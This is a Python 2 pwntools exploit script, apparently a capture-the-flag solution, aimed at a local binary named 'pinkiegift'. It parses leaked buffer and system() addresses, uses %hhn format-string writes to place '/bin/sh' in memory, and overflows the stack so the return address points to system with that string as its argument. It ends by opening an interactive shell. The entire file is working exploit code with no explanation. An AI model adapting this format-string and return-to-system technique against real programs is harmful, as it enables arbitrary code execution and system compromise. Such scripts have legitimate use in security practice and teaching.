#!/usr/bin/env python2
from pwn import *
binfilename = 'pinkiegift'
binf = ELF(binfilename)
r = process(binfilename)

gdb.attach(r,
        """b *0x080485e8""")

recv = r.recvline()
info(hexdump(recv))
buf_addr = int(recv.split()[-2], 16)
system   = int(recv.split()[-1], 16)
info('buf : '    + hex(buf_addr))
info('system : ' + hex(system))

exp      = ''
exp     += p32(buf_addr)
exp     += p32(buf_addr+1)
exp     += p32(buf_addr+2)
exp     += p32(buf_addr+3)
exp     += p32(buf_addr+4)
exp     += p32(buf_addr+5)
exp     += p32(buf_addr+6)
exp     += p32(buf_addr+7)
tmp = len(exp)
for i,c in enumerate("/bin/sh"):
    c = ord(c)
    exp     += "%{}x%{}$hhn".format(0xff-tmp+c+1, i+1)
    tmp = c 
exp     += "%{}x%{}$hhn".format(0xff-tmp+1, i+1+1)

exp     += "A" * (263-len(exp))
exp     += p32(system)
exp     += "BBBB"
exp     += p32(buf_addr)

r.sendline(exp)

r.interactive()
